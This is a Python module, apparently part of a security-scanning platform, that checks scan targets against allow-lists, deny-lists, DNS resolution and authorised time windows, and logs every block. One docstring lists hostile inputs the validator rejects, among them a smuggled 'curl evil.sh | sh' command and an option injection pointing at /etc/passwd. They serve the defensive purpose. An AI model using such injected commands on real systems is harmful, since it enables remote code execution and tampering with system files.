"""Scope guard: decides whether a target may be scanned. Runs before every tool.

Implements SECURITY.md SBD-01 to SBD-06 and SBD-11/12:
- targets are validated strictly (IP, CIDR, hostname or http/https URL);
- every address is checked against the scope's deny-list, the always-deny list
  and the platform's own addresses, then against the allow-list;
- hostnames are resolved and every resolved IP is checked (stops DNS tricks);
- scans only run inside the scope's time window;
- any error blocks the target (fail closed), and every block is logged.

Example:
    scope = Scope(allow=["192.168.56.0/24"], deny=["192.168.56.1"], ...)
    allowed, blocked = check_targets(scope, ["192.168.56.104", "8.8.8.8"])
    # allowed -> [192.168.56.104], blocked -> [8.8.8.8: not in allow-list]
"""

from __future__ import annotations

import ipaddress
import json
import logging
import re
import socket
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Callable, Iterable
from urllib.parse import urlsplit

from cybrx import config

logger = logging.getLogger("cybrx.scope")

IPNetwork = ipaddress.IPv4Network | ipaddress.IPv6Network
IPAddress = ipaddress.IPv4Address | ipaddress.IPv6Address
Resolver = Callable[[str], list[str]]

# RFC 1123 hostname: labels of letters, digits and hyphens, not starting or ending with a hyphen.
_LABEL = r"(?!-)[A-Za-z0-9-]{1,63}(?<!-)"
_HOSTNAME_RE = re.compile(rf"^(?=.{{1,253}}$){_LABEL}(\.{_LABEL})*\.?$")


class InvalidTarget(ValueError):
    """The target string is not a valid IP, CIDR, hostname or http/https URL."""


@dataclass(frozen=True)
class Target:
    """A validated target.

    kind: "ip", "cidr", "hostname" or "url". host: the IP, CIDR or hostname to scope-check.
    Example: Target(raw="https://shop.example.com/x", kind="url", host="shop.example.com").
    """

    raw: str
    kind: str
    host: str


@dataclass(frozen=True)
class Scope:
    """What a group is authorised to scan, and when (CONVENTIONS.md §4).

    allow / deny hold IPs, CIDRs or hostnames. Example lab scope:
        Scope(allow=["192.168.56.0/24"], deny=["192.168.56.1", "192.168.56.100"],
              starts_at=..., ends_at=..., authorised_by="Lab owner", authorised_at=...)
    """

    allow: list[str]
    deny: list[str]
    starts_at: datetime
    ends_at: datetime
    authorised_by: str
    authorised_at: datetime

    def __post_init__(self) -> None:
        for name in ("starts_at", "ends_at", "authorised_at"):
            if getattr(self, name).tzinfo is None:
                raise ValueError(f"{name} must be timezone-aware (UTC)")
        if not self.authorised_by.strip():
            raise ValueError("authorised_by is required (SBD-05)")
        if self.ends_at <= self.starts_at:
            raise ValueError("ends_at must be after starts_at")


@dataclass(frozen=True)
class Decision:
    """The guard's answer for one target."""

    target: str
    allowed: bool
    reason: str
    resolved_ips: tuple[str, ...] = field(default=())
    # Runners must scan resolved_ips (not the hostname) so DNS cannot change between
    # this check and the scan. URL scans (Phase 4) need the same protection.


def default_resolver(hostname: str) -> list[str]:
    """Resolve a hostname to all of its IPv4 and IPv6 addresses."""
    infos = socket.getaddrinfo(hostname, None, proto=socket.IPPROTO_TCP)
    return sorted({info[4][0] for info in infos})


def parse_target(raw: str) -> Target:
    """Validate a target string and classify it. Raises InvalidTarget.

    Examples: "192.168.56.104" -> ip; "192.168.56.0/28" -> cidr;
    "mail.example.com" -> hostname; "https://shop.example.com" -> url;
    "10.0.0.1; curl evil.sh | sh" and "-oN /etc/passwd" -> InvalidTarget.
    """
    if not isinstance(raw, str):
        raise InvalidTarget("target must be a string")
    value = raw.strip()
    if not value or len(value) > config.MAX_TARGET_LENGTH:
        raise InvalidTarget("empty or too long")
    if value.startswith("-"):
        raise InvalidTarget("starts with '-' (option injection)")
    if any(ch.isspace() or ord(ch) < 32 or ord(ch) == 127 for ch in value):
        raise InvalidTarget("contains whitespace or control characters")

    if "://" in value:
        return _parse_url(value)
    if "/" in value:
        try:
            net = ipaddress.ip_network(value, strict=False)
        except ValueError as exc:
            raise InvalidTarget(f"invalid CIDR: {exc}") from None
        return Target(raw=value, kind="cidr", host=str(net))
    try:
        return Target(raw=value, kind="ip", host=str(ipaddress.ip_address(value)))
    except ValueError:
        pass
    if _HOSTNAME_RE.match(value) and not value.replace(".", "").isdigit():
        return Target(raw=value, kind="hostname", host=value.rstrip(".").lower())
    raise InvalidTarget("not an IP, CIDR, hostname or http/https URL")


def _parse_url(value: str) -> Target:
    parts = urlsplit(value)
    if parts.scheme.lower() not in ("http", "https"):
        raise InvalidTarget("only http and https URLs are allowed")
    if parts.username is not None or parts.password is not None:
        raise InvalidTarget("credentials in URLs are not allowed")
    try:
        parts.port  # raises ValueError on a bad port
    except ValueError:
        raise InvalidTarget("invalid port") from None
    host = parts.hostname
    if not host:
        raise InvalidTarget("URL has no host")
    try:
        return Target(raw=value, kind="url", host=str(ipaddress.ip_address(host)))
    except ValueError:
        pass
    if not _HOSTNAME_RE.match(host):
        raise InvalidTarget("URL host is not a valid hostname")
    return Target(raw=value, kind="url", host=host.rstrip(".").lower())


def _split_entries(entries: Iterable[str]) -> tuple[list[IPNetwork], set[str]]:
    """Split allow/deny entries into IP networks and hostnames."""
    networks: list[IPNetwork] = []
    hostnames: set[str] = set()
    for entry in entries:
        entry = entry.strip()
        try:
            networks.append(ipaddress.ip_network(entry, strict=False))
        except ValueError:
            if not _HOSTNAME_RE.match(entry):
                raise ValueError(f"invalid scope entry: {entry!r}") from None
            hostnames.add(entry.rstrip(".").lower())
    return networks, hostnames


def _denied_by(ip: IPAddress, deny: list[IPNetwork]) -> str | None:
    """Return why an address is denied, or None."""
    for net in config.ALWAYS_DENY_NETWORKS:
        if ip.version == net.version and ip in net:
            return f"{ip} is in always-deny range {net}"
    for net in config.PLATFORM_DENY_NETWORKS:
        if ip.version == net.version and ip in net:
            return f"{ip} belongs to the platform itself"
    for net in deny:
        if ip.version == net.version and ip in net:
            return f"{ip} is in the scope deny-list ({net})"
    return None


def _in_networks(ip: IPAddress, networks: list[IPNetwork]) -> bool:
    return any(ip.version == n.version and ip in n for n in networks)


def _check_network(net: IPNetwork, allow: list[IPNetwork], deny: list[IPNetwork]) -> str | None:
    """Return why a CIDR target is refused, or None if all of it is in scope."""
    if net.num_addresses > config.MAX_CIDR_ADDRESSES:
        return f"{net} has {net.num_addresses} addresses (max {config.MAX_CIDR_ADDRESSES})"
    blocked = list(config.ALWAYS_DENY_NETWORKS) + list(config.PLATFORM_DENY_NETWORKS)
    for bad in blocked:
        if net.version == bad.version and net.overlaps(bad):
            return f"{net} overlaps protected range {bad}"
    for bad in deny:
        if net.version == bad.version and net.overlaps(bad):
            return f"{net} overlaps the scope deny-list ({bad}); list allowed addresses separately"
    if not any(net.version == a.version and net.subnet_of(a) for a in allow):
        return f"{net} is not fully inside the allow-list"
    return None


def check_target(
    scope: Scope,
    raw: str,
    now: datetime | None = None,
    resolver: Resolver = default_resolver,
) -> Decision:
    """Decide whether one target may be scanned. Never raises: errors block the target."""
    try:
        return _check(scope, raw, now or datetime.now(timezone.utc), resolver)
    except Exception as exc:  # fail closed (SBD-06)
        return Decision(target=str(raw), allowed=False, reason=f"error during scope check: {exc}")


def _check(scope: Scope, raw: str, now: datetime, resolver: Resolver) -> Decision:
    if now.tzinfo is None:
        raise ValueError("now must be timezone-aware")
    if not (scope.starts_at <= now <= scope.ends_at):
        return Decision(raw, False, "outside the authorised time window (SBD-04)")

    try:
        target = parse_target(raw)
    except InvalidTarget as exc:
        return Decision(str(raw), False, f"invalid target: {exc}")

    allow_nets, allow_hosts = _split_entries(scope.allow)
    deny_nets, deny_hosts = _split_entries(scope.deny)

    if target.kind == "cidr":
        net = ipaddress.ip_network(target.host)
        reason = _check_network(net, allow_nets, deny_nets)
        return Decision(raw, reason is None, reason or "in scope")

    try:
        ips = [ipaddress.ip_address(target.host)]
        hostname = None
    except ValueError:
        hostname = target.host
        if hostname in deny_hosts:
            return Decision(raw, False, f"{hostname} is in the scope deny-list")
        try:
            resolved = resolver(hostname)
        except Exception as exc:
            return Decision(raw, False, f"could not resolve {hostname}: {exc}")
        if not resolved:
            return Decision(raw, False, f"{hostname} did not resolve to any address")
        ips = [ipaddress.ip_address(r) for r in resolved]

    # Treat IPv4-mapped IPv6 (::ffff:127.0.0.1) as the IPv4 address it really is.
    ips = [ip.ipv4_mapped if ip.version == 6 and ip.ipv4_mapped else ip for ip in ips]
    resolved_strs = tuple(str(ip) for ip in ips) if hostname else ()

    for ip in ips:
        reason = _denied_by(ip, deny_nets)
        if reason:
            return Decision(raw, False, reason, resolved_strs)

    hostname_allowed = hostname is not None and hostname in allow_hosts
    if not hostname_allowed:
        for ip in ips:
            if not _in_networks(ip, allow_nets):
                return Decision(raw, False, f"{ip} is not in the allow-list", resolved_strs)
    return Decision(raw, True, "in scope", resolved_strs)


def _redact(raw: str) -> str:
    """Drop query strings and fragments from URLs before logging (SBD-44)."""
    if "://" in str(raw):
        parts = urlsplit(str(raw))
        return f"{parts.scheme}://{parts.netloc}{parts.path}"
    return str(raw)[:200]


def check_targets(
    scope: Scope,
    targets: Iterable[str],
    now: datetime | None = None,
    resolver: Resolver = default_resolver,
) -> tuple[list[Decision], list[Decision]]:
    """Check many targets. Returns (allowed, blocked); every blocked target is logged (SBD-01, SBD-52)."""
    allowed: list[Decision] = []
    blocked: list[Decision] = []
    for raw in targets:
        decision = check_target(scope, raw, now, resolver)
        if decision.allowed:
            allowed.append(decision)
        else:
            blocked.append(decision)
            logger.warning(json.dumps({
                "event": "target_blocked",
                "target": _redact(decision.target),
                "reason": decision.reason,
                "resolved_ips": list(decision.resolved_ips),
                "authorised_by": scope.authorised_by,
            }))
    return allowed, blocked
